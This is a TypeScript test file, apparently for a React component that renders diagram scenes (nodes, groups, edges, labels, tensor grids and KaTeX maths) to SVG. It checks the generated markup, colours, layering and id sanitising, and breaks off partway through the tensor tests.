import { act } from 'react';
import { createRoot } from 'react-dom/client';
import { renderToStaticMarkup } from 'react-dom/server';
import katex from 'katex';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { compileFigure, describeFigure } from '@/lib/figure/compile';
import { FIGURE_MATH_CLASS, FIGURE_MATH_CSS, FIGURE_METRICS } from '@/lib/figure/constants';
import { formatCoordinate as fmt, roundedRectPath, shapePath } from '@/lib/figure/geometry';
import { createHeuristicMeasurer } from '@/lib/figure/measure';
import { figurePalette } from '@/lib/figure/palette';
import {
  ROOT_ID,
  type EdgeModel,
  type FigureScene,
  type FontSpec,
  type GroupModel,
  type Label,
  type LabelBox,
  type LabelSegment,
  type NodeModel,
  type Point,
  type Rect,
  type SceneEdge,
  type SceneGroup,
  type SceneLegend,
  type SceneNode,
} from '@/lib/figure/types';
import { FigureSvg, type FigureSvgProps } from '../FigureSvg';
import { figureSvgBlob, figureSvgDownload, figureSvgMarkup, sceneHasMath } from '../figureSvgFile';

// The renderer's only dependency outside the contract: real KaTeX output, so
// the XML checks below see the markup a browser would. The estimates stay
// real for the few tests that compile a spec end to end.
vi.mock('@/lib/figure/math', async (importOriginal) => ({
  ...(await importOriginal<typeof import('@/lib/figure/math')>()),
  figureMathHtml: (latex: string) => ({
    html: katex.renderToString(latex, { displayMode: false, throwOnError: false, output: 'html' }),
    ok: true,
  }),
}));

const LIGHT = figurePalette('light', 'color');

/* ────────────────────────────────────────────────────────────────────────
 * Hand-built scenes
 * ──────────────────────────────────────────────────────────────────────── */

function font(size = 12, weight: FontSpec['weight'] = 400, italic = false): FontSpec {
  return { family: 'sans', size, weight, italic };
}

/** `"text $x$ more"` → segments; `\n` splits lines. */
function label(source: string): Label {
  const lines = source.split('\n').map((line) =>
    line
      .split(/(\$[^$]+\$)/)
      .filter(Boolean)
      .map<LabelSegment>((part) =>
        part.startsWith('$') ? { kind: 'math', value: part.slice(1, -1) } : { kind: 'text', value: part },
      ),
  );
  return { lines, source, hasMath: lines.some((line) => line.some((s) => s.kind === 'math')) };
}

function labelBox(source: string, rect: Rect, spec: FontSpec = font(), align: LabelBox['align'] = 'center'): LabelBox {
  const parsed = label(source);
  const lineHeight = spec.size * FIGURE_METRICS.lineHeight;
  return {
    ...rect,
    label: parsed,
    font: spec,
    align,
    lineHeight,
    lines: parsed.lines.map((line) => ({ width: rect.width, height: lineHeight, segments: line.map(() => 0) })),
  };
}

function nodeModel(id: string, overrides: Partial<NodeModel> = {}): NodeModel {
  return {
    kind: 'node',
    id,
    parent: ROOT_ID,
    order: 0,
    path: `nodes[${id}]`,
    label: label(id),
    sublabel: null,
    shape: 'box',
    op: null,
    tone: 'neutral',
    border: 'solid',
    pattern: 'none',
    bold: false,
    italic: false,
    stack: 1,
    badge: null,
    cells: null,
    src: null,
    width: null,
    height: null,
    rank: null,
    beside: null,
    sameRank: null,
    ...overrides,
  };
}

function node(id: string, rect: Rect, overrides: Partial<NodeModel> = {}, extra: Partial<SceneNode> = {}): SceneNode {
  const model = nodeModel(id, overrides);
  return {
    id,
    model,
    shape: rect,
    anchor: rect,
    bounds: rect,
    label: model.label.source ? labelBox(model.label.source, rect) : null,
    sublabel: null,
    repeat: null,
    badge: null,
    stackOffset: FIGURE_METRICS.node.stackOffset,
    direction: 'down',
    depth: 1,
    ...extra,
  };
}

function groupModel(id: string, overrides: Partial<GroupModel> = {}): GroupModel {
  return {
    kind: 'group',
    id,
    parent: ROOT_ID,
    order: 0,
    path: `nodes[${id}]`,
    label: null,
    children: [],
    layout: 'flow',
    direction: 'down',
    columns: 2,
    align: 'center',
    gap: null,
    tone: 'neutral',
    border: 'dashed',
    filled: false,
    repeat: null,
    panel: null,
    uniform: false,
    labelPosition: 'top',
    rank: null,
    beside: null,
    sameRank: null,
    ...overrides,
  };
}

function group(id: string, box: Rect, overrides: Partial<GroupModel> = {}, extra: Partial<SceneGroup> = {}): SceneGroup {
  return {
    id,
    model: groupModel(id, overrides),
    box,
    bounds: box,
    label: null,
    repeat: null,
    panel: null,
    depth: 1,
    direction: 'down',
    ...extra,
  };
}

function edgeModel(id: string, from: string, to: string, overrides: Partial<EdgeModel> = {}): EdgeModel {
  return {
    id,
    from,
    to,
    fromSide: null,
    toSide: null,
    label: null,
    line: 'solid',
    weight: 'normal',
    arrow: 'end',
    route: 'ortho',
    kind: 'flow',
    constraint: true,
    tone: null,
    order: 0,
    path: `edges[${id}]`,
    ...overrides,
  };
}

/** A straight vertical edge from (x, y1) down to (x, y2), arrowhead at the end. */
function edge(id: string, from: string, to: string, x: number, y1: number, y2: number, overrides: Partial<EdgeModel> = {}, extra: Partial<SceneEdge> = {}): SceneEdge {
  const model = edgeModel(id, from, to, overrides);
  const { arrowLength, arrowWidth } = FIGURE_METRICS.edge;
  const endHead = { tip: { x, y: y2 }, polygon: [{ x, y: y2 }, { x: x - arrowWidth / 2, y: y2 - arrowLength }, { x: x + arrowWidth / 2, y: y2 - arrowLength }] };
  const startHead = { tip: { x, y: y1 }, polygon: [{ x, y: y1 }, { x: x + arrowWidth / 2, y: y1 + arrowLength }, { x: x - arrowWidth / 2, y: y1 + arrowLength }] };
  const hasEnd = model.arrow === 'end' || model.arrow === 'both';
  const hasStart = model.arrow === 'start' || model.arrow === 'both';
  const top = hasStart ? y1 + arrowLength : y1;
  const bottom = hasEnd ? y2 - arrowLength : y2;
  return {
    id,
    model,
    points: [{ x, y: y1 }, { x, y: y2 }],
    d: `M${fmt(x)} ${fmt(top)}V${fmt(bottom)}`,
    start: hasStart ? startHead : null,
    end: hasEnd ? endHead : null,
    label: null,
    ...extra,
  };
}

function scene(parts: Partial<FigureScene> = {}): FigureScene {
  return {
    width: 300,
    height: 200,
    nodes: [],
    groups: [],
    edges: [],
    legend: null,
    direction: 'down',
    diagnostics: [],
    legibleScale: 1,
    ...parts,
  };
}

/** Q → K, with a group around both: the smallest figure with every layer. */
function basicScene(): FigureScene {
  return scene({
    groups: [group('block', { x: 10, y: 10, width: 120, height: 150 }, { label: label('Block') })],
    nodes: [
      node('q', { x: 30, y: 30, width: 80, height: 26 }),
      node('k', { x: 30, y: 110, width: 80, height: 26 }, { order: 1 }),
    ],
    edges: [edge('q->k', 'q', 'k', 70, 56, 110)],
  });
}

function render(props: Partial<FigureSvgProps> & { scene: FigureScene }): string {
  return renderToStaticMarkup(<FigureSvg palette={LIGHT} idPrefix="fig1" {...props} />);
}

function parse(markup: string): SVGSVGElement {
  const doc = new DOMParser().parseFromString(markup, 'image/svg+xml');
  expect(doc.getElementsByTagName('parsererror')).toHaveLength(0);
  return doc.documentElement as unknown as SVGSVGElement;
}

function layers(svg: Element) {
  const [groups, edges, nodes, edgeLabels] = [...svg.children].filter((child) => child.tagName === 'g');
  return { groups, edges, nodes, edgeLabels };
}

function polygonPoints(points: Point[]): string {
  return points.map((p) => `${fmt(p.x)},${fmt(p.y)}`).join(' ');
}

/* ────────────────────────────────────────────────────────────────────────
 * Tests
 * ──────────────────────────────────────────────────────────────────────── */

describe('FigureSvg: document structure', () => {
  it('is a sized, labelled image with its stylesheet in <defs>', () => {
    const svg = parse(render({ scene: basicScene(), title: 'Attention', description: 'Q feeds K.' }));
    expect(svg.getAttribute('xmlns')).toBe('http://www.w3.org/2000/svg');
    expect(svg.getAttribute('viewBox')).toBe('0 0 300 200');
    expect(svg.getAttribute('width')).toBe('300');
    expect(svg.getAttribute('height')).toBe('200');
    expect(svg.getAttribute('role')).toBe('img');
    expect(svg.getAttribute('aria-labelledby')).toBe('fig1-title fig1-desc');
    expect(svg.querySelector('title')?.id).toBe('fig1-title');
    expect(svg.querySelector('title')?.textContent).toBe('Attention');
    expect(svg.querySelector('desc')?.id).toBe('fig1-desc');
    expect(svg.querySelector('desc')?.textContent).toBe('Q feeds K.');
    expect(svg.querySelector('defs > style')?.textContent).toBe(FIGURE_MATH_CSS);
    expect(svg.getAttribute('font-family')).toContain('Inter');
  });

  it('falls back to "Figure" and drops <desc> when there is no description', () => {
    const svg = parse(render({ scene: basicScene(), title: '  ' }));
    expect(svg.querySelector('title')?.textContent).toBe('Figure');
    expect(svg.querySelector('desc')).toBeNull();
    expect(svg.getAttribute('aria-labelledby')).toBe('fig1-title');
  });

  it('sanitises the id prefix so url(#…) references stay valid', () => {
    const s = scene({ nodes: [node('c', { x: 10, y: 10, width: 60, height: 26 }, { pattern: 'dots' })] });
    const svg = parse(render({ scene: s, idPrefix: '«r1»:x' }));
    const ids = [...svg.querySelectorAll('[id]')].map((el) => el.id);
    expect(ids).toEqual(['f_r1__x-title', 'f_r1__x-dots-neutral']);
    expect(svg.querySelectorAll('[fill="url(#f_r1__x-dots-neutral)"]')).toHaveLength(1);
  });

  it('paints the background only when asked', () => {
    expect(parse(render({ scene: basicScene() })).querySelector(':scope > rect')).toBeNull();
    const rect = parse(render({ scene: basicScene(), background: true })).querySelector(':scope > rect');
    expect(rect?.getAttribute('fill')).toBe(LIGHT.background);
    expect(rect?.getAttribute('width')).toBe('300');
  });

  it('draws groups, then edges, then nodes, then edge labels', () => {
    const svg = parse(render({ scene: basicScene() }));
    const { groups, edges, nodes } = layers(svg);
    expect(groups.querySelector('path')?.getAttribute('d')).toBe(
      roundedRectPath({ x: 10, y: 10, width: 120, height: 150 }, FIGURE_METRICS.group.radius),
    );
    expect(edges.querySelectorAll('polygon')).toHaveLength(1);
    expect(nodes.children).toHaveLength(2);
  });

  it('is deterministic and rounds coordinates to two decimals', () => {
    const s = scene({ nodes: [node('a', { x: 10.123456, y: 20.98765, width: 50.5555, height: 26 })] });
    const once = render({ scene: s });
    expect(render({ scene: s })).toBe(once);
    expect(once).not.toMatch(/\d\.\d{3,}/);
    expect(once).toContain(shapePath('box', s.nodes[0].shape, 'down').d);
  });
});

describe('FigureSvg: nodes', () => {
  it('draws one outline path per node, shaped by geometry.ts', () => {
    const shapes = ['box', 'round', 'circle', 'diamond', 'funnel', 'expand', 'cylinder', 'document', 'parallelogram', 'hexagon'] as const;
    const s = scene({
      width: 1200,
      nodes: shapes.map((shape, i) => node(`n${i}`, { x: 10 + i * 110, y: 20, width: 90, height: 40 }, { shape, tone: 'blue' })),
    });
    const svg = parse(render({ scene: s, onItemClick: () => {} }));
    for (const n of s.nodes) {
      const g = svg.querySelector(`[data-figure-id="${n.id}"]`);
      const { d, detail } = shapePath(n.model.shape, n.shape, n.direction);
      const outline = g?.querySelector('path');
      expect(outline?.getAttribute('d'), n.model.shape).toBe(d);
      expect(outline?.getAttribute('fill')).toBe(LIGHT.tones.blue.fill);
      expect(outline?.getAttribute('stroke')).toBe(LIGHT.tones.blue.stroke);
      if (detail) expect(g?.querySelectorAll('path')[1]?.getAttribute('d')).toBe(detail);
    }
  });

  it('fills neutral nodes with the background and outlines them in ink', () => {
    const svg = parse(render({ scene: basicScene() }));
    const path = layers(svg).nodes.querySelector('path');
    expect(path?.getAttribute('fill')).toBe(LIGHT.background);
    expect(path?.getAttribute('stroke')).toBe(LIGHT.ink);
    expect(path?.getAttribute('stroke-width')).toBe('1');
  });

  it.each([
    ['dashed', { 'stroke-dasharray': '4 3' }],
    ['dotted', { 'stroke-dasharray': '1 2.5', 'stroke-linecap': 'round' }],
    ['bold', { 'stroke-width': '1.8' }],
  ] as const)('draws a %s border', (border, attrs) => {
    const svg = parse(render({ scene: scene({ nodes: [node('a', { x: 10, y: 10, width: 60, height: 26 }, { border })] }) }));
    const path = layers(svg).nodes.querySelector('path');
    for (const [name, value] of Object.entries(attrs)) expect(path?.getAttribute(name)).toBe(value);
  });

  it('draws no outline for border: none and nothing at all for a bare text node', () => {
    const svg = parse(
      render({
        scene: scene({
          nodes: [
            node('a', { x: 10, y: 10, width: 60, height: 26 }, { border: 'none', tone: 'green' }),
            node('b', { x: 100, y: 10, width: 60, height: 26 }, { shape: 'text', border: 'none' }),
          ],
        }),
      }),
    );
    const [a, b] = [...layers(svg).nodes.children];
    expect(a.querySelector('path')?.getAttribute('stroke')).toBe('none');
    expect(a.querySelector('path')?.getAttribute('fill')).toBe(LIGHT.tones.green.fill);
    expect(b.querySelector('path')?.getAttribute('fill')).toBe('none');
    expect(b.querySelector('path')?.getAttribute('stroke')).toBe('none');
    expect(b.querySelector('text')?.textContent).toBe('b');
  });

  it('gives a bare text node a transparent hit surface when interactive', () => {
    const s = scene({ nodes: [node('b', { x: 10, y: 10, width: 60, height: 26 }, { shape: 'text', border: 'none' })] });
    const svg = parse(render({ scene: s, onItemClick: () => {} }));
    expect(svg.querySelector('[data-figure-id="b"] path')?.getAttribute('fill')).toBe('transparent');
  });

  it('stacks copies back to front, offset up and to the right', () => {
    const rect = { x: 20, y: 30, width: 80, height: 26 };
    const svg = parse(render({ scene: scene({ nodes: [node('h', rect, { stack: 3, tone: 'orange' })] }) }));
    const paths = [...layers(svg).nodes.querySelectorAll('path')].map((p) => p.getAttribute('d'));
    const at = (k: number) => shapePath('box', { ...rect, x: rect.x + 4 * k, y: rect.y - 4 * k }, 'down').d;
    expect(paths).toEqual([at(2), at(1), at(0)]);
  });

  it('overlays a pattern between the fill and the outline, with prefixed ids', () => {
    const s = scene({ nodes: [node('c', { x: 10, y: 10, width: 60, height: 26 }, { pattern: 'hatch', tone: 'teal' })] });
    const svg = parse(render({ scene: s, idPrefix: 'figA' }));
    const pattern = svg.querySelector('defs > pattern');
    expect(pattern?.id).toBe('figA-hatch-teal');
    expect(pattern?.getAttribute('patternUnits')).toBe('userSpaceOnUse');
    expect(pattern?.querySelector('path')?.getAttribute('stroke')).toBe(LIGHT.tones.teal.stroke);
    const paths = [...layers(svg).nodes.querySelectorAll('path')];
    expect(paths.map((p) => p.getAttribute('fill'))).toEqual([LIGHT.tones.teal.fill, 'url(#figA-hatch-teal)', 'none']);
    expect(paths[2].getAttribute('stroke')).toBe(LIGHT.tones.teal.stroke);
    // Only the patterns in use are defined.
    expect(svg.querySelectorAll('defs > pattern')).toHaveLength(1);
    expect(parse(render({ scene: basicScene() })).querySelectorAll('defs > pattern')).toHaveLength(0);
  });

  it('defines one pattern per pattern/tone pair, dots included', () => {
    const s = scene({
      nodes: [
        node('a', { x: 10, y: 10, width: 60, height: 26 }, { pattern: 'hatch', tone: 'teal' }),
        node('b', { x: 80, y: 10, width: 60, height: 26 }, { pattern: 'hatch', tone: 'teal' }),
        node('c', { x: 150, y: 10, width: 60, height: 26 }, { pattern: 'dots', tone: 'red' }),
      ],
    });
    const ids = [...parse(render({ scene: s })).querySelectorAll('defs > pattern')].map((p) => p.id);
    expect(ids).toEqual(['fig1-dots-red', 'fig1-hatch-teal']);
  });

  it('draws operator glyphs as strokes and no label text', () => {
    const rect = { x: 40, y: 40, width: 20, height: 20 };
    const glyphs = ['plus', 'times', 'minus', 'concat', 'dot'] as const;
    const s = scene({
      nodes: glyphs.map((op, i) => node(`op${i}`, { ...rect, x: 40 + i * 40 }, { shape: 'op', op, label: label('+') })),
    });
    const svg = parse(render({ scene: s, onItemClick: () => {} }));
    for (const [i, op] of glyphs.entries()) {
      const g = svg.querySelector(`[data-figure-id="op${i}"]`)!;
      expect(g.querySelector('text'), op).toBeNull();
      const cx = 40 + i * 40 + 10;
      if (op === 'dot') {
        expect(g.querySelector('circle')?.getAttribute('cx')).toBe(String(cx));
        continue;
      }
      const glyph = g.querySelectorAll('path')[1].getAttribute('d')!;
      if (op === 'plus') expect(glyph).toBe(`M${cx - 10} 50H${cx + 10}M${cx} 40V60`);
      if (op === 'minus') expect(glyph).toBe(`M${cx - 10} 50H${cx + 10}`);
      if (op === 'times') expect(glyph.match(/[ML]/g)).toEqual(['M', 'L', 'M', 'L']);
      if (op === 'concat') expect(glyph.match(/V/g)).toHaveLength(2);
    }
  });

  it('draws an op node without a glyph as its label', () => {
    const s = scene({ nodes: [node('s', { x: 10, y: 10, width: 24, height: 24 }, { shape: 'op', op: null, label: label('σ') })] });
    expect(layers(parse(render({ scene: s }))).nodes.querySelector('text')?.textContent).toBe('σ');
  });

  it('draws a badge pill and a repeat marker', () => {
    const rect = { x: 20, y: 30, width: 80, height: 26 };
    const badge = labelBox('cached', { x: 80, y: 24, width: 34, height: 13 }, font(8.5));
    const repeat = labelBox('h', { x: 106, y: 36, width: 10, height: 16 }, font(13, 600));
    const s = scene({ nodes: [node('c', rect, { tone: 'teal', badge: 'cached' }, { badge, repeat })] });
    const g = layers(parse(render({ scene: s }))).nodes.children[0];
    const pill = g.querySelector('rect');
    expect(pill?.getAttribute('rx')).toBe('6.5');
    expect(pill?.getAttribute('stroke')).toBe(LIGHT.tones.teal.stroke);
    const texts = [...g.querySelectorAll('text')];
    expect(texts.map((t) => t.textContent)).toEqual(['c', 'cached', 'h']);
    expect(texts[1].getAttribute('fill')).toBe(LIGHT.tones.teal.stroke);
    expect(texts[2].getAttribute('font-weight')).toBe('600');
  });
});

describe('FigureSvg: labels', () => {
  it('draws one tspan per line with computed baselines', () => {
    const rect = { x: 0, y: 0, width: 100, height: 40 };
    const box = labelBox('Multi-Head\nAttention', { x: 10, y: 5, width: 80, height: 30 });
    const s = scene({ nodes: [node('m', rect, { label: label('Multi-Head\nAttention') }, { label: box })] });
    const text = layers(parse(render({ scene: s }))).nodes.querySelector('text')!;
    expect(text.getAttribute('text-anchor')).toBe('middle');
    expect(text.getAttribute('font-size')).toBe('12');
    const spans = [...text.querySelectorAll('tspan')];
    expect(spans.map((t) => t.textContent)).toEqual(['Multi-Head', 'Attention']);
    expect(spans.map((t) => t.getAttribute('x'))).toEqual(['50', '50']);
    // lineHeight 15: baseline = top + 7.5 + 12 × 0.35.
    expect(spans.map((t) => t.getAttribute('y'))).toEqual(['16.7', '31.7']);
  });

  it('anchors left and right aligned labels at the box edges', () => {
    const left = labelBox('Encoder', { x: 12, y: 12, width: 50, height: 14 }, font(11, 600), 'left');
    const right = labelBox('N×', { x: 140, y: 60, width: 20, height: 16 }, font(13, 600), 'right');
    const s = scene({ groups: [group('enc', { x: 10, y: 10, width: 120, height: 100 }, {}, { label: left, repeat: right })] });
    const texts = [...layers(parse(render({ scene: s }))).groups.querySelectorAll('text')];
    expect(texts.map((t) => [t.getAttribute('text-anchor'), t.querySelector('tspan')?.getAttribute('x')])).toEqual([
      ['start', '12'],
      ['end', '160'],
    ]);
    expect(texts[0].getAttribute('fill')).toBe(LIGHT.ink);
  });

  it('draws italic and bold labels', () => {
    const box = labelBox('note', { x: 0, y: 0, width: 40, height: 15 }, font(12, 700, true));
    const s = scene({ nodes: [node('n', { x: 0, y: 0, width: 40, height: 15 }, { shape: 'text', border: 'none' }, { label: box })] });
    const text = parse(render({ scene: s })).querySelector('text')!;
    expect(text.getAttribute('font-style')).toBe('italic');
    expect(text.getAttribute('font-weight')).toBe('700');
  });

  it('uses <foreignObject> only for labels with maths', () => {
    const plain = node('plain', { x: 10, y: 10, width: 80, height: 26 });
    const mathRect = { x: 10, y: 60, width: 80, height: 26 };
    const math = node('math', mathRect, { label: label('Proj $W^{DKV}$ a<b') }, { label: labelBox('Proj $W^{DKV}$ a<b', mathRect) });
    const svg = parse(render({ scene: scene({ nodes: [plain, math] }), onItemClick: () => {} }));
    expect(svg.querySelectorAll('foreignObject')).toHaveLength(1);
    expect(svg.querySelector('[data-figure-id="plain"] foreignObject')).toBeNull();
    expect(svg.querySelector('[data-figure-id="plain"] text')?.textContent).toBe('plain');

    const fo = svg.querySelector('[data-figure-id="math"] foreignObject')!;
    expect(svg.querySelector('[data-figure-id="math"] text')).toBeNull();
    expect([fo.getAttribute('x'), fo.getAttribute('y'), fo.getAttribute('width'), fo.getAttribute('height')]).toEqual([
      // One 15px line centred in the 26px box: top 65.5, less the 1px slack.
      '9', '64.5', '82', '17',
    ]);
    const div = fo.firstElementChild!;
    expect(div.namespaceURI).toBe('http://www.w3.org/1999/xhtml');
    expect(div.getAttribute('class')).toBe(FIGURE_MATH_CLASS);
    expect(div.getAttribute('style')).toContain(`color:${LIGHT.ink}`);
    const line = div.firstElementChild!;
    expect(line.getAttribute('style')).toContain('justify-content:center');
    const run = line.firstElementChild!;
    expect(run.querySelector('.katex')).not.toBeNull();
    // Text around the maths is escaped, not parsed as markup.
    expect(run.textContent).toContain('a<b');
    expect(run.textContent?.startsWith('Proj ')).toBe(true);
  });

  it('draws sublabels in the muted colour', () => {
    const rect = { x: 10, y: 10, width: 90, height: 40 };
    const sub = labelBox('B×T×d', { x: 10, y: 32, width: 90, height: 12.5 }, font(10));
    const s = scene({ nodes: [node('x', rect, { sublabel: label('B×T×d') }, { label: labelBox('x', { x: 10, y: 14, width: 90, height: 15 }), sublabel: sub })] });
    const texts = [...layers(parse(render({ scene: s }))).nodes.querySelectorAll('text')];
    expect(texts.map((t) => [t.textContent, t.getAttribute('fill')])).toEqual([
      ['x', LIGHT.ink],
      ['B×T×d', LIGHT.muted],
    ]);
  });

  it('draws tensor and image labels in page ink, not the tone', () => {
    const dark = figurePalette('dark', 'color');
    const rect = { x: 10, y: 10, width: 44, height: 11 };
    const under = labelBox('K', { x: 10, y: 25, width: 44, height: 15 });
    const s = scene({ nodes: [node('t', rect, { shape: 'tensor', tone: 'blue', cells: { rows: 1, cols: 4, text: null, values: null, pattern: 'none' } }, { label: under })] });
    const text = layers(parse(render({ scene: s, palette: dark }))).nodes.querySelector('g > text:last-of-type');
    expect(text?.getAttribute('fill')).toBe(dark.ink);
  });
});

describe('FigureSvg: edges', () => {
  it('strokes the routed path and draws arrowheads as polygons, never markers', () => {
    const s = scene({
      nodes: [node('a', { x: 10, y: 10, width: 60, height: 26 }), node('b', { x: 10, y: 100, width: 60, height: 26 })],
      edges: [edge('e', 'a', 'b', 40, 36, 100, { arrow: 'both' })],
    });
    const svg = parse(render({ scene: s }));
    expect(svg.querySelector('marker')).toBeNull();
    const g = layers(svg).edges.children[0];
    const path = g.querySelector('path')!;
    expect(path.getAttribute('d')).toBe(s.edges[0].d);
    expect(path.getAttribute('fill')).toBe('none');
    expect(path.getAttribute('stroke')).toBe(LIGHT.edge);
    expect(path.getAttribute('stroke-width')).toBe(String(FIGURE_METRICS.edge.stroke));
    const polygons = [...g.querySelectorAll('polygon')].map((p) => p.getAttribute('points'));
    expect(polygons).toEqual([polygonPoints(s.edges[0].start!.polygon), polygonPoints(s.edges[0].end!.polygon)]);
    expect(g.querySelector('polygon')?.getAttribute('fill')).toBe(LIGHT.edge);
  });

  it('draws no arrowheads for arrow: none', () => {
    const s = scene({ edges: [edge('e', 'a', 'b', 40, 36, 100, { arrow: 'none' })] });
    expect(parse(render({ scene: s })).querySelector('polygon')).toBeNull();
  });

  it.each([
    ['dashed', 'normal', { 'stroke-dasharray': '4 3', 'stroke-width': '1.1' }],
    ['dotted', 'thin', { 'stroke-dasharray': '1 2.5', 'stroke-linecap': 'round', 'stroke-width': '0.8' }],
    ['solid', 'thick', { 'stroke-width': '2' }],
    ['dashed', 'thick', { 'stroke-dasharray': '7.27 5.45', 'stroke-width': '2' }],
  ] as const)('draws a %s %s edge', (line, weight, attrs) => {
    const s = scene({ edges: [edge('e', 'a', 'b', 40, 36, 100, { line, weight })] });
    const path = layers(parse(render({ scene: s }))).edges.querySelector('path')!;
    for (const [name, value] of Object.entries(attrs)) expect(path.getAttribute(name), name).toBe(value);
    if (line === 'solid') expect(path.hasAttribute('stroke-dasharray')).toBe(false);
  });

  it('colours a toned edge, its arrowhead and its label with the tone stroke', () => {
    const lbl = labelBox('residual', { x: 44, y: 60, width: 40, height: 12.5 }, font(10), 'left');
    const s = scene({ edges: [edge('e', 'a', 'b', 40, 36, 100, { tone: 'red' }, { label: lbl })] });
    const svg = parse(render({ scene: s }));
    const { edges, edgeLabels } = layers(svg);
    expect(edges.querySelector('path')?.getAttribute('stroke')).toBe(LIGHT.tones.red.stroke);
    expect(edges.querySelector('polygon')?.getAttribute('fill')).toBe(LIGHT.tones.red.stroke);
    expect(edgeLabels.querySelector('text')?.getAttribute('fill')).toBe(LIGHT.tones.red.stroke);
  });

  it('draws edge labels above the nodes with a halo', () => {
    const lbl = labelBox('$W^Q$ x', { x: 44, y: 60, width: 40, height: 15 }, font(10), 'left');
    const plain = labelBox('skip', { x: 44, y: 80, width: 30, height: 12.5 }, font(10), 'left');
    const s = scene({
      nodes: [node('a', { x: 10, y: 10, width: 60, height: 26 })],
      edges: [
        edge('e', 'a', 'b', 40, 36, 100, {}, { label: plain }),
        edge('f', 'a', 'c', 140, 36, 100, {}, { label: lbl }),
      ],
    });
    const svg = parse(render({ scene: s }));
    const { edgeLabels } = layers(svg);
    // After the node layer in document order.
    expect(svg.lastElementChild).toBe(edgeLabels);
    const text = edgeLabels.querySelector('text')!;
    expect(text.getAttribute('paint-order')).toBe('stroke');
    expect(text.getAttribute('stroke')).toBe(LIGHT.halo);
    expect(text.getAttribute('stroke-width')).toBe('3');
    expect(text.getAttribute('stroke-linejoin')).toBe('round');
    expect(text.getAttribute('fill')).toBe(LIGHT.ink);
    // A maths label gets its halo as a background behind the run.
    const run = edgeLabels.querySelector('foreignObject span');
    expect(run?.getAttribute('style')).toContain(`background-color:${LIGHT.halo}`);
  });
});

describe('FigureSvg: groups', () => {
  it('fills a filled group with the tone tint and borders it in the group stroke', () => {
    const s = scene({ groups: [group('g', { x: 10, y: 10, width: 100, height: 80 }, { tone: 'yellow', filled: true, border: 'solid' })] });
    const path = layers(parse(render({ scene: s }))).groups.querySelector('path')!;
    expect(path.getAttribute('fill')).toBe(LIGHT.tones.yellow.groupFill);
    expect(path.getAttribute('stroke')).toBe(LIGHT.tones.yellow.groupStroke);
  });

  it('leaves an unfilled group empty and dashed', () => {
    const s = scene({ groups: [group('g', { x: 10, y: 10, width: 100, height: 80 })] });
    const path = layers(parse(render({ scene: s }))).groups.querySelector('path')!;
    expect(path.getAttribute('fill')).toBe('none');
    expect(path.getAttribute('stroke-dasharray')).toBe('4 3');
    expect(path.getAttribute('stroke')).toBe(LIGHT.tones.neutral.groupStroke);
  });

  it('draws outer groups before inner ones, whatever the scene order', () => {
    const s = scene({
      groups: [
        group('inner', { x: 20, y: 20, width: 60, height: 40 }, {}, { depth: 2 }),
        group('outer', { x: 10, y: 10, width: 100, height: 80 }, {}, { depth: 1 }),
        group('outer2', { x: 120, y: 10, width: 100, height: 80 }, {}, { depth: 1 }),
      ],
    });
    const svg = parse(render({ scene: s, onItemClick: () => {} }));
    expect([...layers(svg).groups.children].map((g) => g.getAttribute('data-figure-id'))).toEqual(['outer', 'outer2', 'inner']);
  });

  it('draws the title, repeat marker and panel caption', () => {
    const s = scene({
      groups: [
        group('enc', { x: 30, y: 10, width: 100, height: 80 }, {}, {
          label: labelBox('Encoder', { x: 42, y: 16, width: 50, height: 14 }, font(11, 600), 'left'),
          repeat: labelBox('N×', { x: 6, y: 42, width: 16, height: 16 }, font(13, 600), 'right'),
          panel: labelBox('(a) Encoder', { x: 40, y: 98, width: 80, height: 14 }, font(11.5)),
        }),
      ],
    });
    const texts = [...layers(parse(render({ scene: s }))).groups.querySelectorAll('text')].map((t) => t.textContent);
    expect(texts).toEqual(['Encoder', 'N×', '(a) Encoder']);
  });
});

describe('FigureSvg: tensors and images', () => {
  const rect = { x: 10, y: 10, width: 44, height: 44 };

  function tensor(cells: NonNullable<NodeModel['cells']>, overrides: Partial<NodeModel> = {}) {
    return scene({ nodes: [node('t', rect, { shape: 'tensor', tone: 'blue', cells, ...overrides }, { label: null })] });
  }

  function cellRects(markup: string) {
    // The first rect is the background, the last the outline; the rest are cells.
    const rects = [...layers(parse(markup)).nodes.querySelectorAll('rect')];
    return rects.slice(1, -1);
  }

  it('fills the lower triangle for a causal mask', () => {
    const cells = cellRects(render({ scene: tensor({ rows: 4, cols: 4, text: null, values: null, pattern: 'lower' }) }));
    expect(cells).toHaveLength(10);
    expect(cells.every((c) => c.getAttribute('fill') === LIGHT.tones.blue.cell)).toBe(true);
    expect(cells.every((c) => !c.hasAttribute('fill-opacity'))).toBe(true);
    // Row 1 fills columns 0 and 1 only.
    expect(cells.slice(1, 3).map((c) => [c.getAttribute('x'), c.getAttribute('y')])).toEqual([
      ['10', '21'],
      ['21', '21'],
    ]);
  });

  it.each([
    ['upper', 6],
    ['diagonal', 4],
    ['full', 16],
    ['none', 0],
  ] as const)('fills a %s mask', (pattern, count) => {
    expect(cellRects(render({ scene: tensor({ rows: 4, cols: 4, text: null, values: null, pattern }) }))).toHaveLength(count);
  });

  it('shades a heat map by value and skips zero cells', () => {
    const values = [
      [1, 0.5],
      [0, 0.25],
    ];
    const cells = cellRects(render({ scene: tensor({ rows: 2, cols: 2, text: null, values, pattern: 'none' }) }));
    expect(cells.map((c) => c.getAttribute('fill-opacity'))).toEqual([null, '0.5', '0.25']);
  });

  it('shades only the masked cells when a mask and values are both given', () => {
    const values = [
      [0.9, 0.9],
      [0.4, 0.6],
    ];
    const cells = cellRects(render({ scene: tensor({ rows: 2, cols: 2, text: null, values, pattern: 'lower' }) }));
    expect(cells.map((c) => c.getAttribute('fill-opacity'))).toEqual(['0.9', '0.4', '0.6']);
  });

  it('draws the grid rules and the cell text', () => {
    const text = [['the', 'cat', '', null]];
    const s = tensor({ rows: 1, cols: 4, text, values: null, pattern: 'none' }, { tone: 'neutral' });
    const g = layers(parse(render({ scene: s }))).nodes.children[0];
    const background = g.querySelector('rect');
    expect(background?.getAttribute('fill')).toBe(LIGHT.background);
    const grid = g.querySelector('path')!.getAttribute('d')!;
    expect(grid.match(/V/g)).toHaveLength(3);
    expect(grid).not.toContain('H');
    expect([...g.querySelectorAll('text')].map((t) => t.textContent)).toEqual(['the', 'cat']);
    expect(g.querySelector('text > tspan')?.getAttribute('x')).toBe('15.5');
    expect(g.querySelector('text > tspan')?.getAttribute('y')).toBe(fmt(10 + 22 + FIGURE_METRICS.font.cell * 0.35));
  });

